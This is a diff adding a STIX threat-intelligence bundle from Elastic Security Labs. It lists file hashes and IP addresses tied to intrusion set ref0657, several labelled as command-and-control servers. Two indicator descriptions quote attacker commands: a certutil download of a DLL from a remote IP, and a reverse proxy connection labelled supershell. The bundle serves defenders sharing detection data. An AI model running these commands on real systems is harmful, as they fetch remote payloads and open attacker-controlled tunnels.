@@ -1,0 +1,200 @@
+{
+    "type": "bundle",
+    "id": "bundle--19d952c3-99f1-4532-984c-7e245b76ba75",
+    "objects": [
+        {
+            "id": "identity--5963478b-9800-50f4-997b-57546caaeb7f",
+            "spec_version": "2.1",
+            "identity_class": "organization",
+            "name": "Elastic Security Labs",
+            "contact_information": "threat-notification@elastic.co",
+            "created": "2021-04-14T14:56:07.680Z",
+            "modified": "2023-08-29T20:22:46.811Z",
+            "x_organization_type": "vendor",
+            "x_reliability": "A",
+            "x_id": "e5937d41-d6f7-4159-b3d9-3f159cad312f",
+            "x_type": "Organization",
+            "type": "identity"
+        },
+        {
+            "type": "marking-definition",
+            "spec_version": "2.1",
+            "id": "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9",
+            "created": "2017-01-20T00:00:00.000Z",
+            "definition_type": "tlp",
+            "name": "TLP:CLEAR",
+            "definition": {
+                "tlp": "clear"
+            }
+        },
+        {
+            "id": "indicator--c05928a4-0e27-5b84-bf59-4aa32826855b",
+            "spec_version": "2.1",
+            "revoked": false,
+            "confidence": 0,
+            "created": "2024-01-29T16:57:48.597Z",
+            "modified": "2024-01-29T17:06:54.983Z",
+            "pattern_type": "stix",
+            "pattern": "[file:hashes.'SHA-256' = '84b3bc58ec04ab272544d31f5e573c0dd7812b56df4fa445194e7466f280e16d']",
+            "name": "84b3bc58ec04ab272544d31f5e573c0dd7812b56df4fa445194e7466f280e16d",
+            "description": "Simple indicator of observable {84b3bc58ec04ab272544d31f5e573c0dd7812b56df4fa445194e7466f280e16d}",
+            "valid_from": "2024-01-29T17:05:35.312Z",
+            "valid_until": "2025-01-28T17:05:35.312Z",
+            "x_score": 50,
+            "x_detection": false,
+            "x_main_observable_type": "StixFile",
+            "labels": [
+                "ref0657"
+            ],
+            "external_references": [
+                {
+                    "source_name": "ESL Research Publication",
+                    "url": "https://www.elastic.co/security-labs/unmasking-financial-services-intrusion-ref0657"
+                }
+            ],
+            "x_id": "f398267f-3e94-4ee5-855b-6cf2ec725a5a",
+            "x_type": "Indicator",
+            "type": "indicator",
+            "created_by_ref": "identity--5963478b-9800-50f4-997b-57546caaeb7f",
+            "object_marking_refs": [
+                "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
+            ]
+        },
+        {
+            "id": "indicator--9f537dac-0cb0-5605-8b24-5f5cdd5d1937",
+            "spec_version": "2.1",
+            "revoked": false,
+            "confidence": 0,
+            "created": "2024-01-29T16:57:18.192Z",
+            "modified": "2024-01-29T17:06:54.858Z",
+            "pattern_type": "stix",
+            "pattern": "[file:hashes.'SHA-256' = 'bc90ef8121d20af264cc15b38dd1c3a866bfe5a9eb66064feb2a00d860a0e716']",
+            "name": "bc90ef8121d20af264cc15b38dd1c3a866bfe5a9eb66064feb2a00d860a0e716",
+            "description": "Simple indicator of observable {bc90ef8121d20af264cc15b38dd1c3a866bfe5a9eb66064feb2a00d860a0e716}",
+            "valid_from": "2024-01-29T17:05:35.109Z",
+            "valid_until": "2025-01-28T17:05:35.109Z",
+            "x_score": 50,
+            "x_detection": false,
+            "x_main_observable_type": "StixFile",
+            "labels": [
+                "ref0657"
+            ],
+            "external_references": [
+                {
+                    "source_name": "ESL Research Publication",
+                    "url": "https://www.elastic.co/security-labs/unmasking-financial-services-intrusion-ref0657"
+                }
+            ],
+            "x_id": "2d74730b-e188-43ee-945a-ec0ffc47ce40",
+            "x_type": "Indicator",
+            "type": "indicator",
+            "created_by_ref": "identity--5963478b-9800-50f4-997b-57546caaeb7f",
+            "object_marking_refs": [
+                "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
+            ]
+        },
+        {
+            "id": "indicator--8771588e-a7be-525d-9dac-d5f2c2bbf9cf",
+            "spec_version": "2.1",
+            "revoked": false,
+            "confidence": 0,
+            "created": "2024-01-09T16:47:41.308Z",
+            "modified": "2024-01-29T17:06:54.746Z",
+            "pattern_type": "stix",
+            "pattern": "[ipv4-addr:value = '149.104.23.176']",
+            "name": "149.104.23.176",
+            "description": "Simple indicator of observable {149.104.23.176}",
+            "valid_from": "2024-01-29T17:05:34.901Z",
+            "valid_until": "2024-02-28T17:05:34.901Z",
+            "x_score": 50,
+            "x_detection": false,
+            "x_main_observable_type": "IPv4-Addr",
+            "labels": [
+                "c2 server",
+                "ref0657"
+            ],
+            "external_references": [
+                {
+                    "source_name": "ESL Research Publication",
+                    "url": "https://www.elastic.co/security-labs/unmasking-financial-services-intrusion-ref0657"
+                }
+            ],
+            "x_id": "9666ed28-7385-406e-8e74-8358d175d9f9",
+            "x_type": "Indicator",
+            "type": "indicator",
+            "created_by_ref": "identity--5963478b-9800-50f4-997b-57546caaeb7f",
+            "object_marking_refs": [
+                "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
+            ]
+        },
+        {
+            "id": "indicator--b473e085-406c-559e-a386-842f84dca1e3",
+            "spec_version": "2.1",
+            "revoked": false,
+            "confidence": 0,
+            "created": "2024-01-04T20:33:52.017Z",
+            "modified": "2024-01-29T17:06:54.611Z",
+            "pattern_type": "stix",
+            "pattern": "[ipv4-addr:value = '206.237.3.150']",
+            "name": "206.237.3.150",
+            "description": "cmd /c certutil.exe -urlcache -split -f http://206.237.3.150/JuicyDll.dll C:\\users\\public\\1.dll",
+            "valid_from": "2024-01-29T17:05:34.681Z",
+            "valid_until": "2024-02-28T17:05:34.681Z",
+            "x_score": 50,
+            "x_detection": false,
+            "x_main_observable_type": "IPv4-Addr",
+            "labels": [
+                "download",
+                "ref0657"
+            ],
+            "external_references": [
+                {
+                    "source_name": "ESL Research Publication",
+                    "url": "https://www.elastic.co/security-labs/unmasking-financial-services-intrusion-ref0657"
+                }
+            ],
+            "x_id": "dd0093ab-0ad0-4069-a969-5ad254da89bc",
+            "x_type": "Indicator",
+            "type": "indicator",
+            "created_by_ref": "identity--5963478b-9800-50f4-997b-57546caaeb7f",
+            "object_marking_refs": [
+                "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
+            ]
+        },
+        {
+            "id": "indicator--d315516d-b1d5-50f2-9bf4-ac4145aa8b09",
+            "spec_version": "2.1",
+            "revoked": false,
+            "confidence": 0,
+            "created": "2024-01-04T20:04:15.870Z",
+            "modified": "2024-01-29T17:06:54.413Z",
+            "pattern_type": "stix",
+            "pattern": "[ipv4-addr:value = '206.237.0.49']",
+            "name": "206.237.0.49",
+            "description": "c:\\programdata\\AppLaunch.exe proxy -r 206.237.0.49:12355 >> 1.txt",
+            "valid_from": "2024-01-29T17:05:34.386Z",
+            "valid_until": "2024-02-28T17:05:34.386Z",
+            "x_score": 50,
+            "x_detection": false,
+            "x_main_observable_type": "IPv4-Addr",
+            "labels": [
+                "c2 server",
+                "ref0657",
+                "supershell"
+            ],
+            "external_references": [
+                {
+                    "source_name": "ESL Research Publication",
+                    "url": "https://www.elastic.co/security-labs/unmasking-financial-services-intrusion-ref0657"
+                }
+            ],
+            "x_id": "e91da4a1-c6de-4ea6-b287-fbebc6d25a9d",
+            "x_type": "Indicator",
+            "type": "indicator",
+            "created_by_ref": "identity--5963478b-9800-50f4-997b-57546caaeb7f",
+            "object_marking_refs": [
+                "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
+            ]
+        }
+    ]
+}
